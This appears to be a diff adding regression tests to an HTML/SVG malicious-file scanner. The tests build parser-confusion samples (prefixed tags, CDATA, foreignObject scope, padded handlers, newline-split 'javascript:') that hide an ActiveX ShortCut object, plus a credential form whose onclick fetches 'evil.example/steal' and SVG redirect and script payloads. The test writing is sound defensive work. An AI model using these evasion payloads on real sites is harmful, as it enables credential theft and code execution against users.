@@ -945,3 +945,94 @@ def test_review_r12_regressions_abrupt_script_comments_and_nested_ip_html(
     for idx, doc in enumerate(nested_ip_cases):
         found = _rule_ids(_scan(tmp_path, f"r12_nest_ip_{idx}.html", doc))
         assert ("HTML_CHM_ACTIVEX" in found) or ("HTML_CREDENTIAL_FORM" in found), f"case {idx}: {found}"
+
+
+
+def test_html5_prefixed_tags_do_not_enter_rawtext_or_script_or_svg(tmp_path: Path):
+    """r13 Blocker 1: HTML5 has no XML namespace prefixes (<x:style>, <x:script>, <x:svg>)."""
+    for i, prefix_tag in enumerate(("<x:style>", "<x:script>", "<x:textarea>", "<x:svg><![CDATA[>")):
+        html_bytes = (
+            "<!DOCTYPE html><html><body>"
+            f"{prefix_tag}"
+            '<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            '<param name="Command" value="ShortCut"></object>'
+            "</body></html>"
+        ).encode()
+        ids = _rule_ids(_scan(tmp_path, f"prefixed_{i}.html", html_bytes))
+        assert "HTML_CHM_ACTIVEX" in ids, f"Bypassed via {prefix_tag}"
+
+
+def test_html5_prefixed_endtag_does_not_close_rawtext(tmp_path: Path):
+    """r13 Blocker 1b: </x:style> must NOT close HTML5 <style> RAWTEXT."""
+    html_bytes = (
+        b'<!DOCTYPE html><html><body>'
+        b'<style></x:style><x a="</style>'
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+        b'<!--"-->'
+        b'</body></html>'
+    )
+    ids = _rule_ids(_scan(tmp_path, "prefixed_end.html", html_bytes))
+    assert "HTML_CHM_ACTIVEX" in ids
+
+
+def test_outer_html_endtag_closes_foreign_svg_and_respects_foreignobject_scope(tmp_path: Path):
+    """r13 Blocker 2: </div> closes <svg>, while <foreignObject> remains an HTML5 scope boundary."""
+    bypass_html = (
+        b'<!DOCTYPE html><html><body>'
+        b'<div><svg></div>'
+        b'<![CDATA[>'
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+        b'</body></html>'
+    )
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "outer_div_svg.html", bypass_html))
+
+    scope_html = (
+        b'<!DOCTYPE html><html><body>'
+        b'<div><svg><foreignObject></div>'
+        b'<![CDATA[><style>]]>'
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+        b'</foreignObject></svg></div>'
+        b'</body></html>'
+    )
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "fo_scope.html", scope_html))
+
+
+def test_long_event_handler_and_smil_values_not_truncated(tmp_path: Path):
+    """r13 Major 3: padded >4096-char event handlers & >256 SMIL values parts still detected."""
+    pad = " " * 5000
+    cred_html = (
+        '<!DOCTYPE html><html><body>'
+        '<script></script>'
+        '<form><input type="password"></form>'
+        f'<button onclick="/*{pad}*/ fetch(\'https://evil.example/steal\')">Go</button>'
+        '</body></html>'
+    ).encode()
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "long_onclick.html", cred_html))
+
+    svg_redir = (
+        '<svg xmlns="http://www.w3.org/2000/svg" '
+        f'onload="/*{pad}*/ window.location=\'https://evil.example/p\'">'
+        '<rect width="10" height="10"/></svg>'
+    ).encode()
+    svg_ids = _rule_ids(_scan(tmp_path, "long_onload.svg", svg_redir))
+    assert "SVG_SCRIPT" in svg_ids and "SVG_EXTERNAL_REDIRECT" in svg_ids
+
+    smil_svg = (
+        '<svg xmlns="http://www.w3.org/2000/svg">'
+        f'<animate attributeName="href" values="{"a;" * 300}javascript:alert(1)"/>'
+        '</svg>'
+    ).encode()
+    assert "SVG_SCRIPT" in _rule_ids(_scan(tmp_path, "many_smil.svg", smil_svg))
+
+
+def test_meta_refresh_with_embedded_newline_entity(tmp_path: Path):
+    """r13 Nit 4: java&#10;script: inside meta refresh content must be caught."""
+    html_bytes = (
+        b'<!DOCTYPE html><html><head>'
+        b'<meta http-equiv="refresh" content="0;url=java&#10;script:alert(1)">'
+        b'</head><body></body></html>'
+    )
+    assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(_scan(tmp_path, "meta_nl.html", html_bytes))
